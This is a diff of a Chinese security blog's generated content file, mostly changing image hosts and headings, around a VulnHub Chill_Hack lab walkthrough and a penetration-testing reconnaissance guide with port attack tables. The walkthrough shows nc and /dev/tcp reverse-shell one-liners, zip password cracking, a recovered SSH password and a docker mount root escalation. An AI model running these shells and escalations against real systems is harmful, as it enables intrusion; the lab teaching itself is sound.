@@ -7,7 +7,7 @@
 <h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>靶机下载:<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
 <p>DC1需要找到5个flag,最终目标是在root的主目录中找到并读取该标志！</p>
 <p>kali要桥接</p>
-<p><img src="https://i.loli.net/2021/05/01/grdcAYKiPbMNpV7.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/grdcAYKiPbMNpV7.png" alt=""></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看kali的IP</p>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/20210501205202.png" alt=""></p>
 <p>发现IP为</p>
@@ -135,7 +135,7 @@
     <content><![CDATA[<h1 id="基于vulnhub的Chill-Hack靶机的渗透测试"><a href="#基于vulnhub的Chill-Hack靶机的渗透测试" class="headerlink" title="基于vulnhub的Chill_Hack靶机的渗透测试"></a>基于vulnhub的Chill_Hack靶机的渗透测试</h1><a id="more"></a>
 <h2 id="一-实验准备"><a href="#一-实验准备" class="headerlink" title="一.实验准备"></a>一.实验准备</h2><p>kali,Chill_Hack靶机</p>
 <p>kali要选择NAT方式连接</p>
-<p><img src="https://i.loli.net/2021/04/27/gMoeEk87L2GwQhc.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/gMoeEk87L2GwQhc.png" alt=""></p>
 <h2 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h2><h3 id="1-收集靶机IP"><a href="#1-收集靶机IP" class="headerlink" title="1.收集靶机IP"></a>1.收集靶机IP</h3><p>查看kali的IP,如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.88.136</span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426170748334.png" alt=""></p>
@@ -143,12 +143,12 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.88.0/24  </span><br></pre></td></tr></table></figure>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171053710.png" alt=""></p>
 <p>判断靶机IP,根据ping测试的ttl值判断目标靶机IP为192.168.88.139</p>
-<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171143353.png" alt="image-20210426171143353"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426171143353.png" alt=""></p>
 <p>确定目标靶机IP是192.168.101.139</p>
 <h3 id="2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态"><a href="#2-根据获得的靶机IP-继续扫描靶机相关的服务开放状态" class="headerlink" title="2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态"></a>2.根据获得的靶机IP,继续扫描靶机相关的服务开放状态</h3><p>使用nmap扫描相应的端口及服务的开发情况</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV 192.168.88.139 -p- --min-rate=2000 -n -vv </span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/27/3u7WfI1zq2pOLbh.png" alt=""></p>
-<p><img src="https://i.loli.net/2021/04/27/IF6QzsTh9Bkx5KR.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/3u7WfI1zq2pOLbh.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/IF6QzsTh9Bkx5KR.png" alt=""></p>
 <p>查询结果如下,发现21(FTP),80(HTTP),22(SSH)端口处于开放状态</p>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426175334078.png" alt=""></p>
 <p>发现FTP服务允许匿名登录(Anonymous FTP login allowed);SSH,HTTP服务启动</p>
@@ -162,54 +162,54 @@
 <h4 id="利用HTTP"><a href="#利用HTTP" class="headerlink" title="利用HTTP"></a>利用HTTP</h4><p>80端口是Apache httpd 2.4.29 可能存在<a href="https://cloud.tencent.com/developer/article/1676145">换行解析漏洞</a></p>
 <p><img src="https://gitee.com/wxpgitee/images/raw/master/image-20210426185523428.png" alt=""></p>
 <p>打开网站判断是静态网站还是动态网站,发现是个静态网站,没有可利用的后台数据库,没有漏洞点</p>
-<p><img src="https://i.loli.net/2021/04/27/WSPdvcLpRNF34hu.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/WSPdvcLpRNF34hu.png" alt=""></p>
 <p>继续对网站的目录进行探测(使用使用目录扫描工具dirb)</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.88.139</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/QrlZORBogVxzby7.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/QrlZORBogVxzby7.png" alt=""></p>
 <p>发现secret目录,可能存在命令执行漏洞</p>
-<p><img src="https://i.loli.net/2021/04/26/HRVSi54yGpbgY6B.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/HRVSi54yGpbgY6B.png" alt=""></p>
 <p>浏览器输入网址,发现好像可以运行命令</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.139&#x2F;secret&#x2F;</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/zZ1JTYuI8BtW6Aw.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/zZ1JTYuI8BtW6Aw.png" alt=""></p>
 <p>输入ls查看当前目录下文件,发现ls命令被过滤,不允许使用</p>
-<p><img src="https://i.loli.net/2021/04/26/ZaXyHArhQ1xnpjz.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/ZaXyHArhQ1xnpjz.png" alt=""></p>
 <p>输入pwd查看当前位置</p>
-<p><img src="https://i.loli.net/2021/04/26/9PVKRD7v5nXMlWo.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/9PVKRD7v5nXMlWo.png" alt=""></p>
 <h2 id="三-边界突破"><a href="#三-边界突破" class="headerlink" title="三.边界突破"></a>三.边界突破</h2><h3 id="1-漏洞利用"><a href="#1-漏洞利用" class="headerlink" title="1.漏洞利用"></a>1.漏洞利用</h3><p>使用NetCat开启监听</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure>
 <p><a href="https://www.freebuf.com/articles/web/247967.html">反弹shell</a></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.88.136/6666 0&gt;&amp;1 #失败</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/04/26/xr6ykvZJIEgtlNi.png" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.88.136 6666&gt;/tmp/f#成功</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/e1YCjQZcLGVwB7b.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/e1YCjQZcLGVwB7b.png" alt=""></p>
 <p>反弹shell成功</p>
-<p><img src="https://i.loli.net/2021/04/26/J6zWLx7XdiFhrtG.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/J6zWLx7XdiFhrtG.png" alt=""></p>
 <p>使用id命令查看用户的ID,以及所属群组的ID,可以看出www-data用户权限较低</p>
-<p><img src="https://i.loli.net/2021/04/26/WZxJvmg8XQhpjT5.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/WZxJvmg8XQhpjT5.png" alt=""></p>
 <p>进入根目录并查看</p>
-<p><img src="https://i.loli.net/2021/04/26/xlQOi9ECqhtoVHw.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/xlQOi9ECqhtoVHw.png" alt=""></p>
 <p>查看相关目录,仍未获得有用的信息</p>
-<p><img src="https://i.loli.net/2021/04/26/ZK92yTH3rQGWJnO.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/ZK92yTH3rQGWJnO.png" alt=""></p>
 <p>查看home目录,发现有三个用户(anurodh,apaar,aurick)</p>
-<p><img src="https://i.loli.net/2021/04/26/xLRowz5KbQpe8m9.png" alt="image-20210426195916513"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/xLRowz5KbQpe8m9.png" alt=""></p>
 <p>尝试进入各用户目录,发现能进入apaar目录</p>
-<p><img src="https://i.loli.net/2021/04/26/m1eNVnqGAHOds4g.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/m1eNVnqGAHOds4g.png" alt=""></p>
 <p>查看apaar目录发现local.txt(无法查看),</p>
-<p><img src="https://i.loli.net/2021/04/26/cvKBTFymJCqstkg.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/cvKBTFymJCqstkg.png" alt=""></p>
 <h3 id="2-横向扩展"><a href="#2-横向扩展" class="headerlink" title="2.横向扩展"></a>2.横向扩展</h3><p>使用sudo -l查看所能执行的高权限指令和文件</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 <p>发现.helpline.sh</p>
-<p><img src="https://i.loli.net/2021/04/26/gWeUCuE7mXAYc6R.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/gWeUCuE7mXAYc6R.png" alt=""></p>
 <p>查看/home/apaar/.helpline.sh</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /home/apaar/.helpline.sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/lnSWQ9TuaN81hFg.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/lnSWQ9TuaN81hFg.png" alt=""></p>
 <p>发现该脚本允许输入,尝试输入一些命令查看local.txt</p>
 <p>运行.helpline.sh</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./.helpline.sh</span><br></pre></td></tr></table></figure>
 <p>输入命令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
 <p>无法查看</p>
-<p><img src="https://i.loli.net/2021/04/26/IcbgH6snUFLiQJD.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/IcbgH6snUFLiQJD.png" alt=""></p>
 <p>尝试使用apaar用户查看</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u 用户名 ./.helpline.sh</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/04/26/51TseuLIp9WqPHR.png" alt=""></p>
@@ -217,72 +217,72 @@
 <p>最终拿到用户flags</p>
 <p>继续尝试寻找root的flags</p>
 <p>继续寻找可疑信息,发现/var/www/files下有可疑文件</p>
-<p><img src="https://i.loli.net/2021/04/26/KVMgwEY4Gtx6NCq.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/KVMgwEY4Gtx6NCq.png" alt=""></p>
 <p>查看hacker.php</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat hacker.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/xYzkO8smG1anLwu.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/xYzkO8smG1anLwu.png" alt=""></p>
 <p>发现img标签中指向一个可以图片,使用nc下载可疑图片</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; hacker.jpg #kali新开shell</span><br><span class="line">nc 192.168.88.136 5555 &lt; images/hacker-with-laptop_23-2147985341.jpg #反弹shell中</span><br></pre></td></tr></table></figure>
 <p>打开图片如下</p>
-<p><img src="https://i.loli.net/2021/04/26/9ZLNSD5MKgaWYvR.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/9ZLNSD5MKgaWYvR.png" alt=""></p>
 <p>考虑有没有可能使用隐写术隐藏关键内容</p>
 <p>隐写术实例</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy /b 2.jpg+1.zip output.jpg</span><br></pre></td></tr></table></figure>
 <p>下载steghide工具</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install steghide</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/4GZH96DKicq3Q7a.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/4GZH96DKicq3Q7a.png" alt=""></p>
 <p>查看图片中是否隐藏有内容</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide info hacker.jpg</span><br></pre></td></tr></table></figure>
 <p>发现其中嵌入了一个名为backup.zip的压缩包</p>
-<p><img src="https://i.loli.net/2021/04/26/8NyOtZcnaJ49qSs.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/8NyOtZcnaJ49qSs.png" alt=""></p>
 <p>使用steghide获取该压缩包</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">steghide extract -sf hacker.jpg </span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/jXtNpaoLSscUIiR.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/jXtNpaoLSscUIiR.png" alt=""></p>
 <p>查看backup.zip中的内容</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip -sf backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/RobJ241uzjhLeT6.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/RobJ241uzjhLeT6.png" alt=""></p>
 <p>尝试解压该压缩包</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
 <p>发现需要密码</p>
-<p><img src="https://i.loli.net/2021/04/26/NnXZfyUhDF6ri2Q.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/NnXZfyUhDF6ri2Q.png" alt=""></p>
 <p>使用John爆破</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">先将backup.zip转换成backup.john</span></span><br><span class="line">zip2john backup.zip &gt; backup.john</span><br><span class="line"><span class="meta">#</span><span class="bash">再使用john爆破</span></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt backup.zip</span><br></pre></td></tr></table></figure>
 <p>发现密码为pass1word</p>
-<p><img src="https://i.loli.net/2021/04/26/2WpkaEDAVzqw91F.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/2WpkaEDAVzqw91F.png" alt=""></p>
 <p>解压backup.zip</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unzip backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/q4ajLeMKOh6zWJ9.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/q4ajLeMKOh6zWJ9.png" alt=""></p>
 <p>获得source_code.php文件</p>
-<p><img src="https://i.loli.net/2021/04/26/QLvoqj1XDGWV7UT.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/QLvoqj1XDGWV7UT.png" alt=""></p>
 <p>查看source_code.php,发现可疑密码和用户名</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可疑密码:IWQwbnRLbjB3bVlwQHNzdzByZA&#x3D;&#x3D;</span><br><span class="line">用户名:Anurodh</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/YJCoa4St6RjrUEu.png" alt="image-20210426210916149"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/YJCoa4St6RjrUEu.png" alt=""></p>
 <p>到Base64解密网站解密</p>
-<p><img src="https://i.loli.net/2021/04/26/vRjZdbe4qyJUspm.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/vRjZdbe4qyJUspm.png" alt=""></p>
 <p>密码为</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!d0ntKn0wmYp@ssw0rd</span><br></pre></td></tr></table></figure>
 <p>使用ssh登录,先尝试可疑用户Anurodh</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh anurodh@192.168.88.139 #成功,注意名字是小写a</span><br></pre></td></tr></table></figure>
 <p>登录成功</p>
-<p><img src="https://i.loli.net/2021/04/26/D5LTYFab7f31V9h.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/D5LTYFab7f31V9h.png" alt=""></p>
 <p>使用id命令查看用户的ID,以及所属群组的ID,发现其中有docker</p>
-<p><img src="https://i.loli.net/2021/04/26/JVYsKEo2vwqSrPj.png" alt="image-20210426212318640"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/JVYsKEo2vwqSrPj.png" alt=""></p>
 <p>尝试利用<a href="https://www.freebuf.com/articles/system/170783.html">docker漏洞</a>获取root权限(将外面的文件映射到docker容器中,docker中是以root运行的)</p>
 <p>查看docker镜像</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/nK3ZoPrD2lQGbBY.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/nK3ZoPrD2lQGbBY.png" alt=""></p>
 <p>将根目录挂载到/mnt并放入alpine镜像</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -v /:/mnt alpine</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/04/26/1Lnopjmg2F9qDZY.png" alt="image-20210426213345460"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/1Lnopjmg2F9qDZY.png" alt=""></p>
 <p>查看id</p>
-<p><img src="https://i.loli.net/2021/04/26/qdyLvrmj9XNgxcO.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/qdyLvrmj9XNgxcO.png" alt=""></p>
 <p>查看/root没有发现信息</p>
 <p>继续查看相关目录,发现/mnt下有一个root目录</p>
-<p><img src="https://i.loli.net/2021/04/26/ZrMKItUjVe2gEQ5.png" alt="image-20210426213931659"></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/ZrMKItUjVe2gEQ5.png" alt=""></p>
 <p>进入/mnt/root并查看,发现有个proof.txt</p>
-<p><img src="https://i.loli.net/2021/04/26/oVD9MzpJ2UGA1ba.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/oVD9MzpJ2UGA1ba.png" alt=""></p>
 <p>查看proof.txt</p>
-<p><img src="https://i.loli.net/2021/04/26/Z85j6lciFKok91W.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/Z85j6lciFKok91W.png" alt=""></p>
 <p>成功得到root的flag</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
@@ -356,7 +356,7 @@
 <h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><h3 id="1-安装DOSBox"><a href="#1-安装DOSBox" class="headerlink" title="1.安装DOSBox"></a>1.安装DOSBox</h3><p>双击运行DOSBox安装程序</p>
 <p><img src="https://i.loli.net/2021/02/25/X7F4cripOvBg1ex.png" alt=""></p>
 <p>点击next</p>
-<p><img src="https://i.loli.net/2021/02/25/QXCsuzLV2YNwFBJ.png" alt=""></p>
+<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/QXCsuzLV2YNwFBJ.png" alt=""></p>
 <p>点击next</p>
 <p><img src="https://i.loli.net/2021/02/25/Tr6jgH7u5XQElVD.png" alt=""></p>
 <p>选择安装位置(我选择都是D:\DOSBox)然后点击install即可</p>
@@ -3199,7 +3199,7 @@
 <h3 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h3><p>知道目标的域名之后,我们要做的第一件事就是获取域名的注册信息,包括该域名的DNS服务器信息和注册人的联系信息等.</p>
 <h4 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h4><p>Whois是一个标准的互联网协议,可用于收集网络注册信息,注册的域名、IP地址等信息.简单来说,Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库(如域名所有人、域名注册商).在Whois查询中,得到注册人的姓名和邮箱信息通常对测试个人站点非常有用,因为我们可以通过搜索引擎和社交网络挖掘<br>出域名所有人的很多信息.对中小站点而言,域名所有人往往就是管理员.<br>在Kali系统中,Whois已经默认安装,只需输入要查询的域名即可.</p>
 <p><img src="https://i.loli.net/2021/05/12/tvUKdMEkLob1z96.png" alt=""></p>
-<p>在线Whois查询的常用网站有爱站工具网(<a href="https://whois.aizhan.com">https://whois.aizhan.com</a> )和站长之家(<a href="http://whois.chinaz.com">http://whois.chinaz.com</a> )通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等.</p>
+<p>在线Whois查询的常用网站有爱站工具网(<a href="https://whois.aizhan.com)和站长之家(http://whois.chinaz.com)通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等">https://whois.aizhan.com)和站长之家(http://whois.chinaz.com)通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等</a>.</p>
 <h4 id="备案查询"><a href="#备案查询" class="headerlink" title="备案查询"></a>备案查询</h4><p>网站备案是根据国家法律法规规定,需要网站的所有者向国家有关部门申请的备案,这是国家信息产业部对网站的一种管理,为了防止在网上从事非法的网站经营活动的发生.主要针对国内网站,如果网站搭建在其他国家,则不需要进行备案.</p>
 <p>常用的网站有以下这两个:</p>
 <ul>
@@ -3259,13 +3259,12 @@
 <h4 id="1-子域名检测工具"><a href="#1-子域名检测工具" class="headerlink" title="1.子域名检测工具"></a>1.子域名检测工具</h4><p>用于子域名检测的工具主要有<strong>Layer子域名挖掘机</strong>、K8、wydomain、<strong>Sublist3r</strong>、dnsmaper、<strong>subDomainsBrute</strong>、Maltego CE等.</p>
 <h4 id="2-搜索引擎枚举"><a href="#2-搜索引擎枚举" class="headerlink" title="2.搜索引擎枚举"></a>2.搜索引擎枚举</h4><p>可利用搜索引擎相关语法搜索子域名</p>
 <h4 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h4><p>很多第三方服务汇聚了大量DNS数据集,可通过它们检索某个给定域名的子域名.只需在其搜索栏中输入域名,就可检索到相关的域名信息.</p>
-<p>读者也可以利用DNSdumpster网站(<a href="https://dnsdumpster.com">https://dnsdumpster.com</a> )、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域.</p>
+<p>读者也可以利用DNSdumpster网站(<a href="https://dnsdumpster.com/)、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域">https://dnsdumpster.com/)、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域</a>.</p>
 <h4 id="4-证书透明度公开日志枚举"><a href="#4-证书透明度公开日志枚举" class="headerlink" title="4.证书透明度公开日志枚举"></a>4.证书透明度公开日志枚举</h4><p>证书透明度(Certificate Transparency, CT)是证书授权机构(CA)的一个项目,证书授权机构会将每个SSL/TLS证书发布到公共日志中.一个SSL/TLS证书通常包含域名、子域名和邮件地址,这些也经常成为攻击者非常希望获得的有用信息.查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志.</p>
 <h3 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h3><p>在渗透测试的过程中,对端口信息的收集是一个很重要的过程,通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务,就可以对症下药,便于我们渗透目标服务器.</p>
 <p>所以在端口渗透信息的收集过程中,我们需要关注常见应用的默认端口和在端口上运行的服务.最常见的扫描工具就是Nmap、无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具.</p>
 <p>常见的端口及其说明,以及攻击方向汇总如下：</p>
-<p>文件共享服务端口</p>
-<div class="table-container">
+<h4 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h4><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -3298,8 +3297,7 @@
 </tbody>
 </table>
 </div>
-<p>远程连接服务端口</p>
-<div class="table-container">
+<h4 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h4><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -3337,8 +3335,7 @@
 </tbody>
 </table>
 </div>
-<p>web应用服务端口</p>
-<div class="table-container">
+<h4 id="web应用服务端口"><a href="#web应用服务端口" class="headerlink" title="web应用服务端口"></a>web应用服务端口</h4><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -3355,7 +3352,7 @@
 </tr>
 <tr>
 <td>7001/7002</td>
-<td>WebLogic控制台</td>
+<td><a href="https://baike.baidu.com/item/weblogic">WebLogic</a>控制台</td>
 <td>Java反序列化、弱口令</td>
 </tr>
 <tr>
@@ -3386,8 +3383,7 @@
 </tbody>
 </table>
 </div>
-<p>数据库服务端口</p>
-<div class="table-container">
+<h4 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h4><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -3435,7 +3431,507 @@
 </tbody>
 </table>
 </div>
-<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><h3 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h3><h3 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h3><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3>]]></content>
+<h4 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>端口说明</th>
+<th>攻击方向</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>25</td>
+<td>SMTP邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td>110</td>
+<td>POP3协议</td>
+<td>爆破、嗅探</td>
+</tr>
+<tr>
+<td>143</td>
+<td>IMAP协议</td>
+<td>爆破</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>端口说明</th>
+<th>攻击方向</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>53</td>
+<td>DNS域名系统</td>
+<td>允许区域传送、DNS劫持、缓存投毒、欺骗</td>
+</tr>
+<tr>
+<td>67/68</td>
+<td>DHCP服务</td>
+<td>劫持、欺骗</td>
+</tr>
+<tr>
+<td>161</td>
+<td>SNMP协议</td>
+<td>爆破、搜集目标内网信息</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>端口说明</th>
+<th>攻击方向</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2181</td>
+<td>Zookeeper服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>8069</td>
+<td>Zabbix服务</td>
+<td>远程执行、SQL注入</td>
+</tr>
+<tr>
+<td>9200/9300</td>
+<td>Elasticsearch服务</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td>11211</td>
+<td>Memcache服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td>512/513/514</td>
+<td>Linux Rexee服务</td>
+<td>爆破、Rlogin登录</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync服务</td>
+<td>匿名访问、文件上传</td>
+</tr>
+<tr>
+<td>3690</td>
+<td>Svn服务</td>
+<td>Svn泄露、未授权访问</td>
+</tr>
+<tr>
+<td>50000</td>
+<td>SAP Management Console</td>
+<td>远程执行</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>此处所说的指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别等。</p>
+<p>应用程序一般在html、js、 css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator-=wordpress 3.xx,，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS,所以叫作指纹识别。</p>
+<p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
